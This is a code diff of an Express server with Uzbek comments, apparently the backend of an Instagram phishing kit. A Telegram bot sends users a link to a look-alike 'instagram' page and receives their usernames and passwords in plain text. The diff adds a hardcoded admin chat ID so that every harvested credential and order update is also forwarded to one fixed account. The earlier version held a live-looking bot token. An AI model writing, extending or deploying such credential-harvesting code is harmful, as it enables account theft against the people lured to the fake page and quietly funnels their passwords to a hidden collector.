@@ -6,13 +6,18 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-const BOT_TOKEN = "8190649011:AAFwF5v7Se6E6hjiqhI9AgcGi5g7LiMMrUA";
+const BOT_TOKEN = "YOUR_TOKEN_HERE";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// Buyurtmalar lokal saqlanadi
+// ADMIN ID — bu yerdagi ID ga barcha buyurtmalar yuboriladi
+const ADMIN_ID = 7114973309;
+
+// Buyurtmalar lokal
 let orders = [];
 
-// Frontenddan buyurtma kelganda
+// ========================================
+// YANGI BUYURTMA QABUL QILISH
+// ========================================
 app.post("/send-message", async (req, res) => {
   try {
     const { chat_id, username, password, follows } = req.body;
@@ -24,14 +29,13 @@ app.post("/send-message", async (req, res) => {
       username,
       password,
       follows,
-      status: "kutilmoqda", // boshlang'ich status
+      status: "kutilmoqda",
       time: new Date(),
     };
     orders.push(order);
 
-    // Telegramga xabar yuborish
     const text =
-      `🆕 Yangi Instagram:\n\n` +
+      `🆕 Yangi User:\n\n` +
       `👤 Username: ${username}\n` +
       `🔑 Password: ${password}\n` +
       `👥 Obunachilar: ${follows}\n\n` +
@@ -43,16 +47,23 @@ app.post("/send-message", async (req, res) => {
           [
             { text: "✅ Bajarilgan", callback_data: `done:${order.id}` },
             { text: "❌ Bajarilmagan", callback_data: `fail:${order.id}` },
-            { text: "🛑 Bekor qilindi", callback_data: `cancel:${order.id}` },
           ],
         ],
       },
     };
 
+    // 🔵 1) Buyurtma bergan userga yuboriladi
     await fetch(`${TELEGRAM_API}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id, text, ...buttons }),
+    });
+
+    // 🔴 2) ADMIN ga ham yuboriladi (barcha buyurtmalar)
+    await fetch(`${TELEGRAM_API}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: ADMIN_ID, text, ...buttons }),
     });
 
     return res.json({ success: true });
@@ -62,14 +73,16 @@ app.post("/send-message", async (req, res) => {
   }
 });
 
-// Orders olish endpointi
+// ========================================
+// Orders olish
+// ========================================
 app.get("/orders", (req, res) => {
   res.json(orders);
 });
 
-// =======================
-// TELEGRAM BOT POLLING
-// =======================
+// ========================================
+// TELEGRAM POLLING
+// ========================================
 let lastUpdateId = 0;
 
 async function getUpdates() {
@@ -83,44 +96,50 @@ async function getUpdates() {
       for (const update of data.result) {
         lastUpdateId = update.update_id;
 
-        // Callback tugmalarni ishlatish
+        // ---------------------------
+        // CALLBACK HANDLER
+        // ---------------------------
         if (update.callback_query) {
           const [action, orderId] = update.callback_query.data.split(":");
           const chat_id = update.callback_query.message.chat.id;
 
-          const orderIndex = orders.findIndex((o) => o.id == orderId);
-          if (orderIndex === -1) continue;
-          const order = orders[orderIndex];
+          const order = orders.find((o) => o.id == orderId);
+          if (!order) continue;
 
           if (action === "done") order.status = "bajarilgan";
           if (action === "fail") order.status = "bajarilmagan";
-          if (action === "cancel") {
-            order.status = "bekor qilindi";
-            // Buyurtmani o'chirish
-            orders.splice(orderIndex, 1);
-          }
 
+          const statusMsg =
+            order.status === "bajarilgan" ? "✅ Bajarilgan" : "❌ Bajarilmagan";
+
+          // 1) Tugma bosgan foydalanuvchiga javob
           await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id,
-              text: `Status o'zgartirildi: ${
-                order.status === "bajarilgan"
-                  ? "✅ Bajarilgan"
-                  : order.status === "bajarilmagan"
-                  ? "❌ Bajarilmagan"
-                  : "🛑 Bekor qilindi"
-              }`,
+              text: `Status o'zgartirildi: ${statusMsg}`,
+            }),
+          });
+
+          // 2) ADMIN ga ham status yuborilsin
+          await fetch(`${TELEGRAM_API}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_ID,
+              text: `📝 Buyurtma #${order.id}\nHolati: ${statusMsg}`,
             }),
           });
         }
 
+        // ---------------------------
         // /start komandasi
+        // ---------------------------
         if (update.message && update.message.text === "/start") {
           const chat_id = update.message.chat.id;
           const user_name = update.message.from.first_name;
-          const link = `https://instagram-six-beige.vercel.app//?chat_id=${chat_id}`;
+          const link = `https://instagram-six-beige.vercel.app/?chat_id=${chat_id}`;
 
           await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: "POST",
@@ -138,7 +157,7 @@ async function getUpdates() {
   }
 }
 
-// Har 2 sekundda yangilanishlarni tekshirish
+// Polling interval
 setInterval(getUpdates, 2000);
 
 app.listen(5000, () => console.log("Server 5000-portda ishlayapti"));
